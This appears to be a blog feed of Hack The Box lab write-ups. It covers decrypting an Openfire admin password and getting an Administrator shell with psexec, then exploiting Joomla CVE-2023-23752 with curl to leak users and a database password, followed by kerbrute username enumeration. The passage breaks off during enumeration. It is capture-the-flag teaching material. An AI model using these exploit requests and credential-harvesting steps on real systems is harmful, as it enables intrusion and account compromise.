</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.auth.anonymous&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.domain&#39;,&#39;solarlab.htb&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.proxy.enabled&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.socket.ssl.active&#39;,&#39;true&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFVERSION VALUES(&#39;openfire&#39;,34)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(1,&#39;admin&#39;,1700223751042,&#39;Successful admin console login attempt&#39;,&#39;solarlab.htb&#39;,&#39;The user logged in successfully to the admin console from address 127.0.0.1. &#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(2,&#39;admin&#39;,1700223756534,&#39;edited file transfer proxy settings&#39;,&#39;solarlab.htb&#39;,&#39;port = 7777\u000ahardcodedAddress = null\u000aenabled = false&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFMUCSERVICE VALUES(1,&#39;conference&#39;,NULL,0)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBNODE VALUES(&#39;pubsub&#39;,&#39;&#39;,0,&#39;001700223743445&#39;,&#39;001700223743445&#39;,NULL,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,0,&#39;open&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;&#39;,&#39;English&#39;,&#39;&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBAFFILIATION VALUES(&#39;pubsub&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;owner&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,0,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,1,1,10485760,0,1,1,1,1,0,1,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span></code></pre></div><p>The important parts are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span></code></pre></div><p>After a lot of struggle found a <a href="https://github.com/c0rdis/openfire_decrypt">Github Repo</a> that can decrypt the password hash if we have the <code>passwordKey</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn             
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span><span style="display:flex;"><span>*************** (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
</span></span></code></pre></div><p><strong>Administrator Credential</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Administrator:**************
</span></span></code></pre></div><p>Using psexec by Impacket I was able get a shell as Administrator. ** psexec needs a writable share to upload a malicious binary to create a service using the Service Manager. It then uses this binary for the service&rsquo;s binPath and start the server. So, to get a shell using psexec we need following conditions:</p>
<ul>
<li>A writeable share to upload a malicious Binary</li>
<li>Proper privilege token assigned to add, start, stop and remove a service.</li>
</ul>
</li>
</ul>
<h2 id="summary">Summary</h2>
<p>I struggled to find a foothold on the box because I didn&rsquo;t test all the parameters to send the exploit. Also, after gaining openfire user&rsquo;s shell I also found it difficult to recover the Administrator password because I lacked the knowledge of openfire password decryption tool.
Overall, my recon was good.</p>
]]></description></item><item><title>HTB Machine Office</title><link>https://hshakilst.github.io/posts/htb-machines/office/</link><pubDate>Thu, 16 May 2024 17:00:43 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/office/</guid><description><![CDATA[<h1 id="office---htbhttpsapphacktheboxcommachinesoffice">Office - <a href="https://app.hackthebox.com/machines/Office">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="recon">Recon</h2>
<h3 id="nmap">Nmap</h3>
<table>
<thead>
<tr>
<th>Port</th>
<th>State</th>
<th>Service</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>53/tcp</td>
<td>open</td>
<td>domain</td>
<td>Simple DNS Plus</td>
</tr>
<tr>
<td>80/tcp</td>
<td>open</td>
<td>http</td>
<td>httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>88/tcp</td>
<td>open</td>
<td>kerberos-sec</td>
<td>Microsoft Windows Kerberos</td>
</tr>
<tr>
<td>139/tcp</td>
<td>open</td>
<td>netbios-ssn</td>
<td>Microsoft Windows netbios-ssn</td>
</tr>
<tr>
<td>389/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>443/tcp</td>
<td>open</td>
<td>ssl/http</td>
<td>Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)</td>
</tr>
<tr>
<td>445/tcp</td>
<td>open</td>
<td>microsoft-ds?</td>
<td></td>
</tr>
<tr>
<td>464/tcp</td>
<td>open</td>
<td>kpasswd5?</td>
<td></td>
</tr>
<tr>
<td>593/tcp</td>
<td>open</td>
<td>ncacn_http</td>
<td>Microsoft Windows RPC over HTTP 1.0</td>
</tr>
<tr>
<td>636/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3268/tcp</td>
<td>open</td>
<td>ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
<tr>
<td>3269/tcp</td>
<td>open</td>
<td>ssl/ldap</td>
<td>Microsoft Windows Active Directory LDAP</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>Host Script Results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 15731/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 48612/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 52719/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 54522/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>|_clock-skew: 7h55m29s
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-04-28T22:53:10
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span></code></pre></div><p>I think it will be better if we fix our clock-skew that is almost 8 hours. To do that let&rsquo;s run the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo ntpdate -u 10.10.11.3
</span></span></code></pre></div></li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<h3 id="http-enumeration">HTTP Enumeration</h3>
<ul>
<li>
<p><strong>Joomla CMS 4.2 - CVE-2023-23752</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/README.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Joomla! CMSâ¢
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1- Overview
</span></span><span style="display:flex;"><span>	* This is a Joomla! 4.x installation/upgrade package.
</span></span><span style="display:flex;"><span>	* Joomla! Official site: https://www.joomla.org
</span></span><span style="display:flex;"><span>	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
</span></span><span style="display:flex;"><span>	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
</span></span></code></pre></div><p>This version is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check. So we can access some restricted endpoints.</p>
<p><strong>Users</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ curl http://office.htb/api/index.php/v1/users?public=true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{&#34;links&#34;:{&#34;self&#34;:&#34;http:\/\/office.htb\/api\/index.php\/v1\/users?public=true&#34;},&#34;data&#34;:[{&#34;type&#34;:&#34;users&#34;,&#34;id&#34;:&#34;474&#34;,&#34;attributes&#34;:{&#34;id&#34;:474,&#34;name&#34;:&#34;Tony Stark&#34;,&#34;username&#34;:&#34;Administrator&#34;,&#34;email&#34;:&#34;Administrator@holography.htb&#34;,&#34;block&#34;:0,&#34;sendEmail&#34;:1,&#34;registerDate&#34;:&#34;2023-04-13 23:27:32&#34;,&#34;lastvisitDate&#34;:&#34;2024-04-26 19:43:46&#34;,&#34;lastResetTime&#34;:null,&#34;resetCount&#34;:0,&#34;group_count&#34;:1,&#34;group_names&#34;:&#34;Super Users&#34;}}],&#34;meta&#34;:{&#34;total-pages&#34;:1}}
</span></span></code></pre></div><p><strong>Application Config</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> curl http:<span style="color:#ff79c6">//</span>office<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">/</span>api<span style="color:#ff79c6">/</span>index<span style="color:#ff79c6">.</span>php<span style="color:#ff79c6">/</span>v1<span style="color:#ff79c6">/</span>config<span style="color:#ff79c6">/</span>application?public<span style="color:#ff79c6">=</span>true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f1fa8c">&#34;links&#34;</span>:{<span style="color:#f1fa8c">&#34;self&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span style="color:#f1fa8c">&#34;next&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span style="color:#f1fa8c">&#34;last&#34;</span>:<span style="color:#f1fa8c">&#34;http:\/\/office.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span>},<span style="color:#f1fa8c">&#34;data&#34;</span>:[{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_message&#34;</span>:<span style="color:#f1fa8c">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;display_offline_message&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;offline_image&#34;</span>:<span style="color:#f1fa8c">&#34;&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;sitename&#34;</span>:<span style="color:#f1fa8c">&#34;Holography Industries&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;editor&#34;</span>:<span style="color:#f1fa8c">&#34;tinymce&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;captcha&#34;</span>:<span style="color:#f1fa8c">&#34;0&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;list_limit&#34;</span>:<span style="color:#bd93f9">20</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;access&#34;</span>:<span style="color:#bd93f9">1</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;debug_lang_const&#34;</span>:true,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbtype&#34;</span>:<span style="color:#f1fa8c">&#34;mysqli&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;host&#34;</span>:<span style="color:#f1fa8c">&#34;localhost&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;user&#34;</span>:<span style="color:#f1fa8c">&#34;root&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;password&#34;</span>:<span style="color:#f1fa8c">&#34;H0lOgrams4reTakIng0Ver754!&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;db&#34;</span>:<span style="color:#f1fa8c">&#34;joomla_db&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbprefix&#34;</span>:<span style="color:#f1fa8c">&#34;if2tx_&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbencryption&#34;</span>:<span style="color:#bd93f9">0</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}},{<span style="color:#f1fa8c">&#34;type&#34;</span>:<span style="color:#f1fa8c">&#34;application&#34;</span>,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#f1fa8c">&#34;224&#34;</span>,<span style="color:#f1fa8c">&#34;attributes&#34;</span>:{<span style="color:#f1fa8c">&#34;dbsslverifyservercert&#34;</span>:false,<span style="color:#f1fa8c">&#34;id&#34;</span>:<span style="color:#bd93f9">224</span>}}],<span style="color:#f1fa8c">&#34;meta&#34;</span>:{<span style="color:#f1fa8c">&#34;total-pages&#34;</span>:<span style="color:#bd93f9">4</span>}}
</span></span></code></pre></div><p><strong>Credentials</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>root:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>At a first glance it looks like a credential for the database of the Joomla Service. I tried to login using the cred to Joomla Admin panel no luck there.</p>
</li>
</ul>
<h3 id="ad-enumeration">AD Enumeration</h3>
<p>Using the above credential I tried to login using SMB, LDAP no luck there too. Because I only possesed one username <code>Administrator</code>, having only this will not help. I had a password so I can try password spraying attack on the AD but I needed some valid usernames.</p>
<p>Because <code>kerberos</code> is enabled on the machine it can help us to gather usernames. Because by default I think kerberos authentication on AD returns a unique error for usernames that don&rsquo;t exist.</p>
<ul>
<li>
<p><strong>User Enumeration (kerberos)</strong></p>
<p>Using <a href="https://github.com/ropnop/kerbrute">kerbrute by ropnop</a> I tested a list of users against kerberos and tried to find some valid usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">$</span> kerbrute userenum <span style="color:#ff79c6">--</span>dc dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">-</span>d office<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">~/</span>SecLists<span style="color:#ff79c6">/</span>Usernames<span style="color:#ff79c6">/</span>xato<span style="color:#ff79c6">-</span>net<span style="color:#ff79c6">-</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span>million<span style="color:#ff79c6">-</span>usernames<span style="color:#ff79c6">.</span>txt <span style="color:#ff79c6">-</span>o kerbrute<span style="color:#ff79c6">.</span>log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __             __               __     
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_____  _____<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_  _______  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>____ 
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">//</span>_<span style="color:#ff79c6">/</span> _ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> __ \<span style="color:#ff79c6">/</span> ___<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> __<span style="color:#ff79c6">/</span> _ \
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">/</span> ,<span style="color:#ff79c6">&lt;</span> <span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  __<span style="color:#ff79c6">/</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/|</span>_<span style="color:#ff79c6">|</span>\___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>  <span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">.</span>___<span style="color:#ff79c6">/</span>_<span style="color:#ff79c6">/</span>   \__,_<span style="color:#ff79c6">/</span>\__<span style="color:#ff79c6">/</span>\___<span style="color:#ff79c6">/</span>                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version: dev (n<span style="color:#ff79c6">/</span>a) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> Ronnie Flathers @ropnop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  Using KDC(s):
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">08</span>:<span style="color:#bd93f9">53</span> <span style="color:#ff79c6">&gt;</span>  	dc<span style="color:#ff79c6">.</span>office<span style="color:#ff79c6">.</span>htb:<span style="color:#bd93f9">88</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">09</span>:<span style="color:#bd93f9">30</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">12</span>:<span style="color:#bd93f9">34</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 Administrator@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 ewhite@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">57</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 etower@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">58</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dwolfe@office<span style="color:#ff79c6">.</span>htb
